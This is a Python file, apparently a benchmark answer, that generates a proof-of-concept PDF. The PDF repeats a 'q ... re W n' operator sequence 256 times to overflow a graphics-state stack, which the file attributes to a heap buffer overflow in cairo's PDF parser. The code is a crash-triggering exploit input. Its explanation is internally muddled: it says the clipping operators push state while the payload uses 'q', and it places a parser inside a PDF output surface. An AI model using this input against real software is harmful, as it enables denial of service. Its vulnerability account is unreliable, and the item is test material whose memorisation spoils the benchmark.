import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in cairo's PDF parser.
        It occurs when the graphics state stack, which has a fixed size of 256,
        is overflowed by pushing too many states. The clipping operators ('W', 'W*')
        would push a new state without checking the current stack depth.

        This PoC constructs a PDF file with a content stream that repeats a
        clipping operation 256 times. The 256th operation causes a write
        out of bounds of the `gstate_stack` array within the `cairo_pdf_surface_t`
        struct, triggering a crash.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # The internal cairo gstate stack size is 256 (indices 0-255).
        # We need 256 state-saving operations to overflow it.
        # The 256th operation will attempt to write to index 256.
        repetitions = 256
        
        # A simple PDF operator sequence to define a path and then clip it.
        # The 'W' operator triggers the vulnerable code path that saves
        # graphics state without a depth check.
        payload_unit = b"q 1 1 1 1 re W n\n"
        
        # Create the full payload by repeating the unit.
        stream_content = payload_unit * repetitions
        
        # Use an in-memory buffer to build the PDF file. This allows for easy
        # calculation of object offsets for the cross-reference table.
        pdf_buffer = io.BytesIO()
        
        # Standard PDF Header
        header = b"%PDF-1.7\n"
        pdf_buffer.write(header)
        
        # A dictionary to store the byte offset of each PDF object.
        offsets = {}
        
        # Object 1: Document Catalog (root object)
        offsets[1] = pdf_buffer.tell()
        pdf_buffer.write(b"1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n")
        
        # Object 2: Page Tree Node
        offsets[2] = pdf_buffer.tell()
        pdf_buffer.write(b"2 0 obj\n<</Type /Pages /Kids [3 0 R] /Count 1>>\nendobj\n")
        
        # Object 3: Page Object, referencing the content stream (Object 4)
        offsets[3] = pdf_buffer.tell()
        pdf_buffer.write(b"3 0 obj\n<</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R>>\nendobj\n")

        # Object 4: The Content Stream containing our malicious payload
        offsets[4] = pdf_buffer.tell()
        pdf_buffer.write(f"4 0 obj\n<</Length {len(stream_content)}>>\nstream\n".encode('ascii'))
        pdf_buffer.write(stream_content)
        pdf_buffer.write(b"\nendstream\nendobj\n")
        
        # Cross-reference (xref) table, which lists the offsets of all objects.
        xref_offset = pdf_buffer.tell()
        pdf_buffer.write(b"xref\n")
        # There are 5 objects, from 0 to 4.
        pdf_buffer.write(b"0 5\n")
        # Object 0 is special and always marked as free.
        pdf_buffer.write(b"0000000000 65535 f \n")
        for i in range(1, 5):
            pdf_buffer.write(f"{offsets[i]:010d} 00000 n \n".encode('ascii'))
        
        # PDF Trailer
        pdf_buffer.write(b"trailer\n")
        pdf_buffer.write(b"<</Size 5 /Root 1 0 R>>\n")
        pdf_buffer.write(b"startxref\n")
        pdf_buffer.write(f"{xref_offset}\n".encode('ascii'))
        pdf_buffer.write(b"%%EOF")
        
        return pdf_buffer.getvalue()